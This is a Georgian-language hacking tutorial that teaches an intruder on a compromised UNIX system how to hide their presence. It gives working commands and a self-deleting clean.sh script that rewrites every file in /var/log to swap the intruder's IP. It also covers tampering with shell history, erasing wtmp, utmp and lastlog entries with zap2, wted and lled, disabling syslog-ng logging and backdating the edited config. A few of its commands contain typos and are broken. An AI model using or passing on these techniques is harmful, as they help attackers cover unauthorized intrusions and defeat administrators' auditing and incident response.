ვთქვათ მაგარი ხაკერი გახდი. რამე სისტემაში შეხვედი, ნუ გეშინია არც პირველი ხარ და არც ბოლო.
ეხლა აგიხსნი როგორ უნდა დამალო შენი თავი რომელიმე UNIX-ის ტიპის სისტემაში.

# ფაილების წაშლის შესახებ

თუ გგონიათ რომ ლინუქსში წაშლილი ფაილების აღდგენა არ არის შესაძლი, წაუკითხეთ ეს: http://www.faqs.org/docs/Linux-mini/Ext2fs-Undeletion.html და აზრი შეგეცვლებად.
ლოგ ფაილის წაშლა არ არის მომგებიანი იმიტომ რომ ადმინი შეამჩნევს და ეჭვიც შეეპარება.

# /home და /tmp

არაფერი არ დატოვო /home-ში და /tmp -ში

# ნახე რა ფაილები შეცვალე როცა სისტემაში რაღაცეებს ჩალიჩობდი

```
ls -altr
```

# შეცვალე shell-ის ინფორნაციები (ნახმარი პროგრამები/ბრძანებები…)

დაადგინე რომელი ტიპის shell-ით იმუშავე

```
echo $SHELL
```

თუ shell-ი არის csh-ი, ქენი ასე:

```
mv .logout save.1
echo rm .history>.logout
echo rm .logout>>.logout
echo mv save.1 .logout>>.logout
```

P.S: თუ shell-ი არის bash-ი შეწვალე .bash_history-ც

# შეცვალე log ფაილები

log ფაილი არის ფაილი რომელშიც იწერება ინფორმაციები თუ რა ხდება სისტემაში.

**/var/log/wtmp :** სისტემაში შესვლის და გამოსვლის დრო, სერვერის სახელი და terminal-ის ნომერი.

**/var/run/utmp :** აჩვენებს ყველა მომხმარეს

**/var/log/lastlog :** მომხმარეების სია (წარსული სა ეხლანდელი)

სისტემის მფლობელს შეუძლია რომ გაიგოს ვინ საიდან შემოვიდა და რამდენი ხამი გაგრძელდა დასხმა თუ ამ ფაილებს არ შეცვლი.
იწერება ინფორმაცია შემოსვლაზე FTP-თი, rlogin-ით, telnet-ით და სხვა პროგრამების და პროტოკოლებით.
არ წაშალოთ ეს ფაილები, თორე ადმინისტრატორს ეჭვი შეეპარება და მიხვდება რომ ხაკერი იყო შესული მის სისტემაში.
არსებობს პროგრამები რომლებსაც შეუძლიათ მაგ ფაილების შეცვლა ისე რომ შენი კვალი დამალოს. ასეთი პროგრამები არის: **zap** და **zap2** (00000-ით წვლის ბოლოში).

**/var/log/lastlog** რომ შეცვალო root-ი უნდა იყო.
თუ root-ი ვერ გახდი (ვთქვათ exploit-ების მეშვეობით) ზოგიერთ UNIX-ზე rlogin-ით უნდა შეხვიდე სისტემაში და ეს **/var/log/lastlog**-ს ცვლის.

ვთქვქთ მინდა რომ დავმალო ჩემი IP მისამართი, რომელიცაა 127.0.0.1:

წინა პირობა: უნდა იყო root-ი რომ ლოგ ფაილები შეცვალო, თუ არა და ლოგ ფაილებში დაფიქსირდება შენი ნაჩალიჩარი. და სხვა რომ შევა სისტემაში აღნიშნული იქნება: last login from xxx.com time:0:00 date:xx/xx/xx.

**ეტაპი 1: ვნახოთ რა ლოგ ფაილებია სისტემაში**

```
root ~  #  ls -lh /var/log/
total 8.2M
drwxr-xr-x 2 root root   72 2009-09-11 07:30 ConsoleKit
-rw-r--r-- 1 root root  48K 2009-10-02 22:11 Xorg.0.log
-rw-r--r-- 1 root root  49K 2009-10-02 10:11 Xorg.0.log.old
-rw-r----- 1 root log  2.7K 2009-10-03 01:10 auth.log
-rw-r----- 1 root log  1.1K 2009-09-26 22:49 auth.log.1
-rw-r----- 1 root log   11K 2009-09-25 22:00 auth.log.2
-rw------- 1 root root    0 2009-09-09 11:21 btmp
-rw-r--r-- 1 root root 4.1K 2009-10-03 06:01 crond
-rw-r--r-- 1 root root 1.8K 2009-09-27 00:02 crond.1
-rw-r--r-- 1 root root  12K 2009-09-26 00:02 crond.2
-rw-r----- 1 root log   49K 2009-10-03 06:25 daemon.log
-rw-r----- 1 root log   26K 2009-09-26 22:50 daemon.log.1
-rw-r----- 1 root log  245K 2009-09-25 22:17 daemon.log.2
-rw-r--r-- 1 root root  35K 2009-10-02 22:10 dmesg.log
-rw-r----- 1 root log  5.2K 2009-10-03 01:45 errors.log
-rw-r----- 1 root log   416 2009-09-26 22:49 errors.log.1
-rw-r----- 1 root log   14K 2009-09-25 22:16 errors.log.2
-rw-r----- 1 root log  671K 2009-10-03 06:25 everything.log
-rw-r----- 1 root log  150K 2009-09-26 23:50 everything.log.1
-rw-r----- 1 root log  1.9M 2009-09-25 23:57 everything.log.2
-rw------- 1 root root 3.3K 2009-10-02 22:10 faillog
drwxr-xr-x 2 root root  176 2009-09-20 00:02 httpd
-rw-r----- 1 root log  615K 2009-10-03 06:25 kernel.log
-rw-r----- 1 root log  122K 2009-09-26 22:50 kernel.log.1
-rw-r----- 1 root log  1.7M 2009-09-25 23:57 kernel.log.2
-rw-r--r-- 1 root root  30K 2009-10-02 22:10 lastlog
drwxr-xr-x 2 http http  112 2009-09-26 11:13 lighttpd
-rw-r----- 1 root log  503K 2009-10-03 06:25 messages.log
-rw-r----- 1 root log  118K 2009-09-26 23:50 messages.log.1
-rw-r----- 1 root log  1.5M 2009-09-25 23:57 messages.log.2
drwxr-xr-x 2 root root   48 2009-07-18 06:39 old
-rw-r--r-- 1 root root  31K 2009-10-02 23:26 pacman.log
-rw-r----- 1 root log  2.5K 2009-10-02 22:10 syslog.log
-rw-r----- 1 root log   619 2009-09-26 22:49 syslog.log.1
-rw-r----- 1 root log  6.2K 2009-09-25 21:59 syslog.log.2
-rw-r----- 1 root log  2.4K 2009-10-02 22:10 user.log
-rw-r----- 1 root log   498 2009-09-26 22:49 user.log.1
-rw-r----- 1 root log  7.8K 2009-09-25 22:00 user.log.2
-rw-rw-r-- 1 root root    0 2009-10-03 00:02 wtmp
-rw-r--r-- 1 root root 479K 2009-10-02 22:10 wtmp.1
```

**ეტაპი 2: ჩვენი IP მისამართის სხვა IP მისამართით შენაცვლა**

```
root /var/log  # cat cron | grep -v 127.0.0.1 > file.tmp  # -v ნიშნავს 127.0.0.1-ს გარდა, ანუ ჩვენი IP მისამართი არ იქნება ახალ ფაილში.
root /var/log  # mv file.tmp cron
root /var/log  # cat cron.1 | grep -v 127.0.0.1 > file.tmp
root /var/log  # mv file.tmp cron.1
და ასე შემდეგ
```

რაც შეიძლება bash სკრიპტის მეშვეობით (clean.sh) ავტომატურად ვქნათ:

```
#!/bin/bash
IP="$1"     # ჩვენი IP მისამართი
IP2="$2"   # ყალბი IP მისამართი
cd /var/log/
ls -1 > list.tmp
for files in `cat list.tmp`; do
sed 's/'$IP'/'$IP2'/g' $files > tmp.$$    # ჩვენ IP მისამართს ვცვლით ყალბი IP მისამართით
mv tmp.$$ $files
done
rm -f list.tmp
cd
echo "Done"
rm -f $0    # სკრიპტის თითონვე წაშლა
```

რომ გამოიყენოთ ქენით:

```
root /var/log  # chmod a+x clean.sh
root /var/log  # ./clean.sh 127.0.0.1 145.7.4.11
Done
root /var/log  #
```

ეს ჩვენ IP-ს (127.0.0.1) შეცვლის სხვა IP მისამართით(145.7.4.11), თან ისე რომ ამტკიცებს რომ შეცვლილი IP მისამართი ზუსტად იგივე ციფრისგან შედგება (xxx.x.x.x) რომ ლოგ ფაილის ზომა არ შეცვალოს (თუ შეიცვალა, პროგრამა როგორიცაა tripwire მას გააშუქებს და ადმინიც გაიგებს).

IP მისამართის გაწმენდის შემდეგ იგივე ქენი შენი hostname-სთვის, თუ შენი IP მისამართს hostname-იც ემთხვევა, როგორც 127.0.0.1 არის "localhost".

**ეტაპი 3: .bash_history**

ამ ყველაფრის შემდეგ, შენი ნამოქმედარი მაინც იქმება შენახული ~/.bash_history ფაილში, მაგ ამ ფაილში ინფორმაცია იქნება შეტანილი მხოლოდ სისტემიდან გასვლის დროს.
ალბათ გინდა რომ რომ სისტემიდან გახვიდე და მერე შეხვიდე რომ ფაილის რედაქტირება მოახდინო, მაგრამ გასვლის დროს მაინც ახლიდან დაფიქსირდება შენი ნამოქმედარი.

შეგიძლია რომ .bash_history /dev/null-ს შეუერთო:

```
[user@localhost user]$ rm -f ~/.bash_history
[user@localhost user]$ ln -s /dev/null ~/.bash_history
```

მაგრამ ადმინი ნახავს რომ .bash_history /dev/null-ს უდრის

# ლოგ ფაილების შემცვლელი პროგრამები

## zap2

როცა შეხვალ სისტემაში გაიგე თუ ვინმე არის თუ არა იმავე სისტემაში, შენს გარდა

```
root ~  #  w
 23:42:26 up  1:07,  3 users,  load average: 0.00, 0.03, 0.02
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1      22:35    1:06m  1:32   0.00s /bin/sh /usr/bin/startx
root     pts/0     22:35   23:43   0.01s  0.01s bash
root     pts/1     22:39    0.00s  0.04s  0.00s w
```

პროგრამის წყარო კოდში მიუთითე, სად არიან ლოგ ფაილები:

```
#define WTMP_NAME "/var/log/wtmp"
#define UTMP_NAME "/var/run/utmp"
#define LASTLOG_NAME "/var/log/lastlog"
```

მერე გაწმინდე ლოგ ფაილები და დაიწყე ჩალიჩი:

```
zap2 შენი_შემოსვლის_ლოგინ
```

ნახე თუ utmp ლოგ ფაილიდან ფიქსირდები თუ არა:

```
root ~  #  w
```

## wted

სშლის FTP-ს ლოგებს რომლებიც wtmp ლოგ ფაილშია.

```
Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
            -h      This help
            -f      Use FILE instead of default
            -a      Show all entries found
            -u      Show all entries for USER
            -b      Show NULL entries
            -e      Erase USER completely
            -c      Erase all connections containing HOST
            -z      Show ZAP'd entries
            -x      Attempt to remove ZAP'd entries completely
```

შლის dzveli_vereli მომხმარებლის კვალს.

```
wted -x -e dzveli_vereli
```

ოფიციალური **wtmp** ლოგ ფაილი გაყალბებული ლოგ ფაილით შეცვალე:

```
chmod 644 wtmp.tmp
cp wtmp.tmp /var/log/wtmp
```

დააზუსტე რომ wted.c წყარო კოდში, ლოგ ფაილის ადგილი შენ სისტემას შეეფერება.

## lled

სშლის ლოგებს რომლებიც **lastlog** ლოგ ფაილშია.

```
Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
-h      This help
-f      Use FILE instead of default
-a      Show all entries found
-u      Show all entries for USER
-b      Show NULL entries
-e      Erase USER completely
-c      Erase all connections containing HOST
-z      Show ZAP'd entries
-x      Attempt to remove ZAP'd entries completely
```

წაშალე ინფორმაცია შენი მომხმარებელის სესახებ და შენი hostname-ის შესახებ.

```
lled -e username -c hostname
```

ოფიციალური **lastlog** ლოგ ფაილი გაყალბებული ლოგ ფაილით შეცვალე:

```
chmod 644 lastlog.tmp
cp lastlog.tmp /var/log/lastlog
```

დააზუსტე რომ lled.c წყარო კოდში, ლოგ ფაილის ადგილი შენ სისტემას შეეფერება.


# იპოვე ფაილები რომლებიც შეცვალე შენი შესვლის შემდეგ

როცა სისტემაში შეხვალ ქენი ასე:

```
touch /tmp/check
```

შემდეგ გააგრძელე მუშაუბა ;)

შემდეგ კი ქენი ასე:

```
find / -newer /tmpcheck -print
```

ან

```
find / -ctime 0 -print
```

ან

```
find / -cmin 0 -print
```

და ნახავთ თუ რომელი ფაილიები შეიცვალა შენგან სისტემის გატეხვის შემდეგ.

# შეამოწმე კატალოგები

**/usr/adm**

**/var/adm**

**/var/log**

# დასაცავი პროგრამების მანიპულაცია

საკმაოდ დაცულ სისტემებში, დრო და დრო ანალიზი კეთდება, ეს ყველაფერი cron-ის მეშვეობით.
ანალიზი არის შედგენილი სხვა და სხვა პროგარმების მიერ, ზოგი ამოწმებს ფაილების ზომას, log-ებს…
sniffer-ები უფრო მეტად ინახულება **/bin**-ში რახან root-ი უნდა იყო რომ sniffer-მა იმუშაოს.

თუ გინდა რომ cron-ის პარამეტრები ნახო: **/var/spool/cron/crontabs**

ნახე რა პროგრამებს ამუშავებს, მით უმეტეს root-ი :

```
crontab -l root
```

დაცვის პროგრამები არის: **tiger**, **spi**, **tripewire**, **15**, **binaudit**, **hobgoblin**, **s3**, **snort** და სხვა.

# რაც არ უნდა ქნა

არ დაბრუნდე შენ სისტემაში დაჰაკური სისტემიდან, შეიძლება ადმიბს sniffer-ი ქონდეს გაშვებული და გაიგოს შენი ვინაობა.

# გაფრთხილება

შეგიძლია გამოიყენო wingate proxy მაგრამ შანსია რომ ეგ ყალბი proxy იყოს უშიშროების სამსახურის, რომ უთვალთვალონ ჰაკერებს ნუთუ როგორ შედიან სისტემებში.

იცოდეთ რომ **/etc/syslog.conf** ან **/etc/syslog-ng.conf** ფაილშია მითითებული თუ რა ინფორმაცია რომელ ლოგ ფაილშუ ჩაიწერროს.
ამ ფაილში ნახავთ რა სად იგზავნება, შეტყობინება ელ.მისამართზე იგზავნება თუ არა.
დაადგინე რა ფაილებში იწერება ინფორმაციები შენს შესახებ, და მაფ ფაილებში ინფორმაციის შეტანის მექანიზმი გათიშე /etc/syslog-ng.conf ფაილის რედაქტირებით.

როდის მოხდა ამ ფაილის ბოლო რედაქტირება?

```
root ~  #  ls -l /etc/syslog-ng.conf 
-rw-r--r-- 1 root root 3700 2009-07-18 06:37 /etc/syslog-ng.conf
```

```
root ~  #  ps -A | grep syslog
 1395 ?        00:00:00 syslog-ng
 1396 ?        00:00:00 syslog-ng
```

შემდეგ პროგრამა ხელახლად ისე გაუშვით რომ ცვლილებები აღიქვას:

```
root ~  # kill -HUP 1395
root ~  # kill -HUP 1396
```

touch ბრძანებით ფაილის თარიღი ისე შეცვალე რომ რედაირების წინათ მყოფ თარიღს დაემთხვეს.

კიდე შეიძლება დაგაინტერესოს **/etc/login.defs** ფაილმა, ეს ფაილი su ბრძანებისთვისაა და ზოგჯერ ლოგ ფაილებში შეაქვს ინფორმაცია, სისტემის კონფიგურაციას გააჩნია.

აგრეთვე შეხედე **/var/spool/cron/** პაპკაში, რომ ნახო ადმინი რა ბრძანებებს უშვებს დრო და დრო.

აგრეთვე შეცვალე **/var/log/messages** ლოგ ფაილი, სადაც ფიქსირდება ვინ და როდის შევიდა სისტემაში/

```
root ~  # grep -v ლოგინ >messages.2
root ~  # rm messages
root ~  # mv messages2 messages
root ~  # kill -HUP syslogd pid-ის ნომერი
```

ფრთხილათ იყავი, ყველა ტექნიკა არ არის აქ ახრწერილი, შემდეგში დავუმატებ.
